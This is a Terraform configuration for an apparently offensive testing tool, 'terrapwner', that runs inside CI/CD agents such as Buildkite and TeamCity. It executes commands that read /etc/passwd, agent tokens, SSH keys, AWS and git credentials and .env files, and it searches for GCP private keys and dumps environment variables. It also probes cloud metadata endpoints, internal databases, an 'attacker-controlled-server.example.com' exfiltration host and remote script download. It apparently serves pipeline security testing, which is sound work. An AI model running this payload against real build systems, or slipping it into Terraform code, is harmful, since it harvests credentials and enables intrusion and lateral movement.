
# =============================================================================
# 1. COMMAND EXECUTION TESTING
# =============================================================================
# Test what commands can be executed on the CI/CD agent

# Basic identity check - who is the agent running as?
data "terrapwner_local_exec" "whoami" {
  command = ["whoami"]
}

# Check current working directory
data "terrapwner_local_exec" "pwd" {
  command = ["pwd"]
}

# List available system tools (potential for abuse)
data "terrapwner_local_exec" "available_tools" {
  command = ["which", "curl", "wget", "nc", "ncat", "python", "python3", "ruby", "perl"]
}

# Check if we can read sensitive system files
data "terrapwner_local_exec" "read_passwd" {
  command = ["cat", "/etc/passwd"]
}

# Check sudo capabilities (should fail in secure environments)
data "terrapwner_local_exec" "sudo_check" {
  command = ["sudo", "-n", "-l"]
}

# Check for Docker socket access (container escape risk)
data "terrapwner_local_exec" "docker_socket" {
  command = ["ls", "-la", "/var/run/docker.sock"]
}

# Check if we can list running processes
data "terrapwner_local_exec" "process_list" {
  command = ["ps", "aux"]
}

# =============================================================================
# 2. BUILDKITE-SPECIFIC CHECKS
# =============================================================================

# Check for Buildkite agent token in environment
data "terrapwner_local_exec" "buildkite_token_check" {
  command = ["printenv", "BUILDKITE_AGENT_ACCESS_TOKEN"]
}

# Check Buildkite agent configuration directory
data "terrapwner_local_exec" "buildkite_config" {
  command = ["ls", "-la", "/etc/buildkite-agent/"]
}

# Check for Buildkite hooks directory (potential for persistence)
data "terrapwner_local_exec" "buildkite_hooks" {
  command = ["ls", "-la", "/etc/buildkite-agent/hooks/"]
}

# Check Buildkite build directory permissions
data "terrapwner_local_exec" "buildkite_builds" {
  command = ["ls", "-la", "/var/lib/buildkite-agent/builds/"]
}

# =============================================================================
# 3. TEAMCITY-SPECIFIC CHECKS
# =============================================================================

# Check for TeamCity agent configuration
data "terrapwner_local_exec" "teamcity_config" {
  command = ["ls", "-la", "/opt/teamcity-agent/conf/"]
}

# Check TeamCity agent properties file (may contain secrets)
data "terrapwner_local_exec" "teamcity_properties" {
  command = ["cat", "/opt/teamcity-agent/conf/buildAgent.properties"]
}

# Check TeamCity work directory
data "terrapwner_local_exec" "teamcity_work" {
  command = ["ls", "-la", "/opt/teamcity-agent/work/"]
}

# Check for TeamCity agent token
data "terrapwner_local_exec" "teamcity_token_check" {
  command = ["grep", "-r", "authorizationToken", "/opt/teamcity-agent/"]
}

# =============================================================================
# 4. NETWORK CONNECTIVITY PROBES
# =============================================================================
# Test what network connections the agent can make

# Can we reach the internet? (should be restricted in secure environments)
data "terrapwner_network_probe" "internet_http" {
  type    = "tcp"
  host    = "google.com"
  port    = 80
  timeout = 5
}

data "terrapwner_network_probe" "internet_https" {
  type    = "tcp"
  host    = "google.com"
  port    = 443
  timeout = 5
}

# Test DNS resolution (potential for DNS exfiltration)
data "terrapwner_network_probe" "dns_resolution" {
  type    = "dns"
  host    = "google.com"
  timeout = 5
}

# Can we reach common cloud metadata services? (SSRF risk)
data "terrapwner_network_probe" "aws_metadata" {
  type    = "tcp"
  host    = "169.254.169.254"
  port    = 80
  timeout = 3
}

data "terrapwner_network_probe" "gcp_metadata" {
  type    = "tcp"
  host    = "metadata.google.internal"
  port    = 80
  timeout = 3
}

data "terrapwner_network_probe" "azure_metadata" {
  type    = "tcp"
  host    = "169.254.169.254"
  port    = 80
  timeout = 3
}

# Can we reach internal services? (lateral movement risk)
# Replace these with your actual internal service addresses
data "terrapwner_network_probe" "internal_db" {
  type    = "tcp"
  host    = "internal-database.local"
  port    = 5432
  timeout = 3
}

data "terrapwner_network_probe" "internal_redis" {
  type    = "tcp"
  host    = "internal-redis.local"
  port    = 6379
  timeout = 3
}

# Common exfiltration ports
data "terrapwner_network_probe" "exfil_ssh" {
  type    = "tcp"
  host    = "attacker-controlled-server.example.com"  # Replace with test server
  port    = 22
  timeout = 3
}

data "terrapwner_network_probe" "exfil_dns" {
  type    = "udp"
  host    = "8.8.8.8"
  port    = 53
  timeout = 3
}

# =============================================================================
# 5. ENVIRONMENT VARIABLE ANALYSIS
# =============================================================================
# Dump environment variables to find secrets and sensitive data

data "terrapwner_env_dump" "all_env_vars" {
  # This will capture all environment variables
  # Look for: API keys, tokens, passwords, credentials
}

# =============================================================================
# 6. SENSITIVE FILE DISCOVERY
# =============================================================================

# Check for SSH keys
data "terrapwner_local_exec" "ssh_keys" {
  command = ["ls", "-la", "/root/.ssh/", "/home/*/.ssh/"]
}

# Check for AWS credentials
data "terrapwner_local_exec" "aws_creds" {
  command = ["cat", "/root/.aws/credentials", "/home/*/.aws/credentials"]
}

# Check for GCP service account keys
data "terrapwner_local_exec" "gcp_keys" {
  command = ["find", "/", "-name", "*.json", "-exec", "grep", "-l", "private_key", "{}", ";"]
}

# Check for .env files
data "terrapwner_local_exec" "env_files" {
  command = ["find", "/", "-name", ".env*", "-type", "f"]
}

# Check for git credentials
data "terrapwner_local_exec" "git_creds" {
  command = ["cat", "/root/.git-credentials", "/home/*/.git-credentials"]
}

# =============================================================================
# 7. STATE FILE ANALYSIS
# =============================================================================
# Check what sensitive data might be in Terraform state

data "terrapwner_state_file" "state_secrets" {
  # Analyzes the current Terraform state for sensitive data
  # This helps identify if secrets are being stored in state
}

# =============================================================================
# 8. REMOTE SCRIPT EXECUTION TEST
# =============================================================================
# Test if the agent can download and execute remote scripts

data "terrapwner_remote_exec" "curl_test" {
  url     = "https://example.com/test-script.sh"  # Replace with your test script
  method  = "GET"
  timeout = 10
}
